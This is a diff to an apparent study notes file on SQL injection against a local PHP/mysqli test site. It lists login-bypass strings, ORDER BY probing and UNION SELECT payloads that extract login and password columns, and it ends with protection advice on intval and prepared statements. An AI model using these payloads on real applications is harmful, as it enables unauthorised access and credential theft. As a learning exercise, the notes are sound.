@@ -52,11 +52,15 @@ Authentification field/login
 q' or 1=1; -- 
 q' or 1=1; #
 
-Search field
-SQL-injection via proc interface in mysqli
+Search field 
+
+    SQL-injection via proc interface in mysqli
+
+Tested on versions: MariaDB 5.5, MySQL 5.5 (& x64), 5.6
+
 What do you need in SQL-inj is pacience. And attacker will definatly have it.
 If i try to break srough
-v%' order by 10; -- 
+v%' order by 10; -- -
 i cant see Error code but i can see another Error
 "Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in 
 C:\OpenServer\OSPanel\domains\sqlxss\index.php on line 76"
@@ -81,7 +85,19 @@ id,login,pass,creation_time
 so, we need one more step...
 v%' union all select 1,login,pass,4 FROM users; -- -
 
+    SQL-injection via object-oriented(oo) interface in mysqli
 
+All code from the block above fits for this too properly.
+Except that there is no mistake or any Error output after this code :)
+v%' order by 10; -- -
+but atacker still could use this
+v%' and 1=0 union all select 1; -- -
+v%' and 1=0 union all select 1,2; -- -
+v%' and 1=0 union all select 1,2,3; -- -
+v%' and 1=0 union all select 1,2,3,4; -- -
+until it works
+
+that`s why unprotected Search Fields are very dangerous.
 
 How to protect
 <---------------->
@@ -95,3 +111,8 @@ $q = "SELECT * FROM `tab` WHERE `id` = ".intval($_GET['user_id']);
 use Prepared Statements (PS) via MySQLi or PDO
 
 PS in signin.php is a good protection from SQL-Injections
+
+
+    For what purpose did I do all this ?
+    - To see for myself if there are any "pitfalls".
+    
